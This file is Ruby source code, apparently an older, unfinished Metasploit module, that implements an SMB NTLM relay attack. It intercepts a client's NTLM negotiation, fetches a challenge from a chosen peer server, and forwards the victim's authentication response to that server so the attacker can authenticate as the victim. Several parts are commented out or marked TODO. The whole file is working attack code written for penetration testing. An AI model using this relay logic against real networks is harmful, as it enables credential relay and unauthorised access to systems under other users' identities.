require 'ruby_smb/ntlm'
require 'gssapi'

module Msf
  module Exploit::Remote::SMB
    include ::Msf::Exploit::SMBHashCapture

    #
    # A GSS provider that authenticates clients via the passing of a hash to a specified remote host.
    #
    class RubySMBMITMProviderOld < ::Msf::Exploit::SMBHashCapture::HashCaptureNTLMProvider
      include RubySMB::NTLM

      def initialize(opts)
        raise ArgumentError, 'Must specify a peer_host' unless opts[:peer_host]
        raise ArgumentError, 'Must specify a peer_port' unless opts[:peer_port]
        raise ArgumentError, 'Must specify a local_host' unless opts[:local_host]
        super(allow_anonymous: opts[:allow_anonymous], default_domain: opts[:default_domain], listener: opts[:listener])

        @peer_host = opts[:peer_host]
        @peer_port = opts[:peer_port]
        @local_host = opts[:local_host]
        @timeout = opts[:timeout] ? opts[:timeout] : 3
      end

      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        Authenticator.new(self, server_client)
      end

      class MITMNtlmSession  < ::Net::NTLM::Client::Session
        @client_lmv2 = nil

        def set_ntlmv2_hash(hash)
          @ntlmv2_hash = hash
        end

        def set_lmv2_hash(hash)
          @client_lmv2 = hash
        end

        def lmv2_resp
          @client_lmv2.nil? ? super : @client_lmv2
        end

        def update_blob(client_chall)
          @blob =
            begin
              b = Blob.new
              b.timestamp = timestamp
              b.challenge = client_chall
              b.target_info = target_info
              b.serialize
            end
        end
      end

      # class MITMNtlmClient < ::Net::NTLM::Client
      #
      #   def init_context(resp = nil, channel_binding = nil)
      #     if resp.nil?
      #       @session = nil
      #       type1_message
      #     else
      #       @session = MITMNtlmSession.new(self, Net::NTLM::Message.decode64(resp), channel_binding)
      #       @session.authenticate!
      #     end
      #   end
      # end

      class Authenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
        # TODO: Move this out of the Authenticator class
        class MITMClient < ::RubySMB::Client
          def initialize(dispatcher, smb1: true, smb2: true, smb3: true, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil)
            super(dispatcher,
                  smb1: smb1,
                  smb2: smb2,
                  smb3: smb3,
                  username: username,
                  password: password,
                  domain: domain,
                  local_workstation: local_workstation,
                  always_encrypt: always_encrypt,
                  ntlm_flags: ntlm_flags)

            @provider = provider
          end

          def get_peer_server_challenge(victim_type1_msg)
            @version = negotiate

            if @version == 'SMB1'
              # neg_pkt = smb1_ntlmssp_negotiate_packet
              # neg_pkt.set_type1_blob(victim_type1_msg.serialize)
              # resp = send_recv(neg_pkt)
              #
              # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
              #
              # # Store the available OS information before going forward.
              # @peer_native_os = challenge_packet.data_block.native_os.to_s
              # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
              #
              # @user_id = challenge_packet.smb_header.uid
              #
              # type2_message_encoded = smb1_type2_message(challenge_packet)
              #
              # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
              #
              # type2_challenge.challenge
            else
              # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
              #  - changes the type1_blob to match the blob of the type1 messages received from the client
              #  - returns the challenge messages received from the server

              server_type1_pkt = smb2_ntlmssp_negotiate_packet
              server_type1_pkt.set_type1_blob(victim_type1_msg.serialize)
              server_type2_pkt_raw = send_recv(server_type1_pkt)
              server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)

              if @dialect == '0x0311'
                update_preauth_hash(server_type2_pkt)
              end

              @session_id = server_type2_pkt.smb2_header.session_id
              type2_ntlm_message = smb2_type2_message(server_type2_pkt)

              server_type2_message = Net::NTLM::Message.decode64(type2_ntlm_message)

              # TODO Below commented out code needs moved into auth_attempt
              # Additionally, we need to have the type3 message created using the @ntlm_client.session object
              #   this may require rummaging around in the guts of @ntlm_client and it's session to figure out how
              #   to do that

              @server_type3_message = @ntlm_client.init_context(type2_ntlm_message)

              @session_key = @ntlm_client.session_key
              server_type2_message = @ntlm_client.session.challenge_message
              store_target_info(server_type2_message.target_info) if server_type2_message.has_flag?(:TARGET_INFO)
              @os_version = extract_os_version(server_type2_message.os_version.to_s) unless server_type2_message.os_version.empty?

              server_type2_message
            end
          rescue ::Exception => e
            msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
            elog(msg, error: e)
            print_warning msg
          end

          def send_auth_attempt(victim_type3_message)
            if @version == 'SMB1'
              # neg_pkt = smb1_ntlmssp_negotiate_packet
              # neg_pkt.set_type1_blob(victim_type1_msg.serialize)
              # resp = send_recv(neg_pkt)
              #
              # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
              #
              # # Store the available OS information before going forward.
              # @peer_native_os = challenge_packet.data_block.native_os.to_s
              # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
              #
              # @user_id = challenge_packet.smb_header.uid
              #
              # type2_message_encoded = smb1_type2_message(challenge_packet)
              #
              # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
              #
              # type2_challenge.challenge
            else
              # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
              #  - changes the type1_blob to match the blob of the type1 messages received from the client
              #  - returns the challenge messages received from the server

              # server_type1_pkt = smb2_ntlmssp_negotiate_packet
              # server_type1_pkt.set_type1_blob(victim_type1_msg.serialize)
              # server_type2_pkt_raw = send_recv(server_type1_pkt)
              #
              # if @dialect == '0x0311'
              #   update_preauth_hash(server_type2_pkt_raw)
              # end
              #
              # server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)
              # @session_id = server_type2_pkt.smb2_header.session_id
              #
              # type2_ntlm_message = smb2_type2_message(server_type2_pkt)
              #
              # @type3_msg = @ntlm_client.init_context(type2_ntlm_message)
              # @ntlm_client.session.challenge_message.challenge


              # force_encoding needed to avoid an +Encoding::CompatibilityError+ when serializing the type3 message.
              # serialize happens in the rubyntlm library
              # TODO overwrite type3 class to have a serialize method that supports different encodings of strings
              type3_opts = {
                :lm_response   => victim_type3_message.lm_response.force_encoding("ASCII-8BIT"),
                :ntlm_response => victim_type3_message.ntlm_response.force_encoding("ASCII-8BIT"),
                :domain        => victim_type3_message.domain.force_encoding("ASCII-8BIT"),
                :user          => victim_type3_message.user.force_encoding("ASCII-8BIT"),
                :workstation   => victim_type3_message.workstation.force_encoding("ASCII-8BIT"),
                :flag          => @server_type3_message.flag,
                :session_key   => @server_type3_message.session_key # Can be empty, but in that case it's just setting the default value explicitly
              }
              combined_type3_message = ::Net::NTLM::Message::Type3.create type3_opts

              # Set AUTHENTICATE_MESSAGE.MIC to Z(16)
              #  If (NTLMSSP_NEGOTIATE_KEY_EXCH flag is set in NegFlg
              #    AND (NTLMSSP_NEGOTIATE_SIGN OR NTLMSSP_NEGOTIATE_SEAL are set in NegFlg) )
              #      Set ExportedSessionKey to RC4K(KeyExchangeKey,
              #       AUTHENTICATE_MESSAGE.EncryptedRandomSessionKey)
              #  Else
              #      Set ExportedSessionKey to KeyExchangeKey
              #  EndIf
              #  Set MIC to HMAC_MD5(ExportedSessionKey, ConcatenationOf(
              #          NEGOTIATE_MESSAGE, CHALLENGE_MESSAGE,
              #          AUTHENTICATE_MESSAGE))
              #
              #  Set ClientSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Client")
              #  Set ServerSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Server")
              #  Set ClientSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Client")
              #  Set ServerSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Server")
              #  RC4Init(ClientHandle, ClientSealingKey)
              #  RC4Init(ServerHandle, ServerSealingKey)

              @server_type3_message.domain = victim_type3_message.domain.force_encoding("ASCII-8BIT")
              @server_type3_message.user = victim_type3_message.user.force_encoding("ASCII-8BIT")
              @server_type3_message.workstation = victim_type3_message.workstation.force_encoding("ASCII-8BIT")

              packet = RubySMB::SMB2::Packet::SessionSetupRequest.new

              packet.smb2_header.session_id = @session_id
              packet.set_type3_blob(victim_type3_message.serialize)
              packet.security_mode.signing_enabled = 1

              response = send_recv(packet)
              if @dialect == '0x0311'
                update_preauth_hash(packet)
              end

              # raw = smb2_ntlmssp_authenticate(victim_type3_message, @session_id)
              response = smb2_ntlmssp_final_packet(response)

              if @smb3 && !@session_encrypt_data && response.session_flags.encrypt_data == 1
                @session_encrypt_data = true
              end

              response
            end
          rescue ::Exception => e
            msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
            elog(msg, error: e)
            print_warning msg
          end

          def normalize_type3_encoding(type3_msg)
            type3_msg.security_buffers.map!{ |_buffer_name, security_buffer| security_buffer.value.force_encoding("ASCII-8BIT") }
          end
        end

        def reset!
          super

          # Server that we are passing the hash to
          @server_connection = nil
        end

        #
        # Process the NTLM type 1 message and build a type 2 response message.
        #
        # @param [Net::NTLM::Message::Type1] type1_msg the NTLM type 1 message received by the client that should be
        #   processed
        # @return [Net::NTLM::Message::Type2] the NTLM type 2 response message with which to reply to the client
        def process_ntlm_type1(type1_msg)
          @server_connection = create_mitm_client(@provider.peer_host, @provider.peer_port,
                                                  @provider.local_host, @provider.timeout)

          server_type2_msg = @server_connection.get_peer_server_challenge(type1_msg)
          client_type2_msg = super

          # Overwriting the Authenticator server_challenge to ensure future hash generation is performed correctly
          @server_challenge = [server_type2_msg.challenge].pack('Q<')
          client_type2_msg.challenge = server_type2_msg.challenge
          client_type2_msg.flag = server_type2_msg.flag
          client_type2_msg.security_mode.signing_enabled = 0

          client_type2_msg
        end

        #
        # Process the NTLM type 3 message and either accept or reject the authentication attempt.
        #
        # @param [Net::NTLM::Message::Type3] type3_msg the NTLM type 3 message received by the client that should be
        #   processed
        # @return [WindowsError::ErrorCode] an NT Status error code representing the operations outcome where
        #   STATUS_SUCCESS is a successful authentication attempt and anything else is a failure
        def process_ntlm_type3(victim_type3_msg, raw_type3_msg)
          # captures hash using +HashCaptureAuthenticator+ process_ntlm_type3 method
          # super(victim_type3_msg)

          resp = @server_connection.send_auth_attempt(victim_type3_msg)


          # TODO wat do with successful smb connection?



          ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
        end

        def create_mitm_client(peer_host, peer_port, local_host, timeout)
          sock = Rex::Socket::Tcp.create(
            'LocalHost' => local_host,
            'PeerHost' => peer_host,
            'PeerPort' => peer_port,
            'Server' => false,
            'Timeout' => timeout,
            'Context' =>
              {
                'Caller' => self
              }
          )

          dispatcher = RubySMB::Dispatcher::Socket.new(sock)
          client = MITMClient.new(dispatcher, provider: self, username: '', password: '',
                                  smb1: false, smb2: true, smb3: true)

          client
        rescue ::Exception => e
          msg = "Unable to create connection to server #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end

      end

      attr_reader :peer_host, :peer_port, :local_host, :timeout
    end
  end
end
